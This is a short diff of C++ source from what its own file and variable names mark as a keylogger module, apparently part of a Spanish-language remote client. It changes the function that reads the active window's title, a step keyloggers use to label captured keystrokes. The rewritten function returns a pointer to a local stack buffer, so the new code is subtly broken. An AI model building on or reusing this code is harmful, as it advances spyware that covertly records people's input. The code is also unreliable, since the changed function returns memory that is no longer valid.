@@ -1,4 +1,4 @@
-#include "cliente.hpp"
+ #include "cliente.hpp"
 #include "mod_keylogger.hpp"
 #include "misc.hpp"
 
@@ -8,13 +8,12 @@ HHOOK kHook = nullptr;
 bool g_Run = false;
 
 
-std::string GetActiveWindow_Title() {
+const char* GetActiveWindow_Title() {
     char buffer[1024];
-    std::string strOut = "None";
-    if (GetWindowTextA(GetForegroundWindow(), buffer, 1024) > 0) {
-        strOut = buffer;
+    if (GetWindowTextA(GetForegroundWindow(), buffer, 1024) == 0) {
+        std::memcpy(buffer, "Sin titulo\0", 11);
     }
-    return strOut;
+    return buffer;
 }
 
 std::string Add_Terminator(const char* cBuffer) {
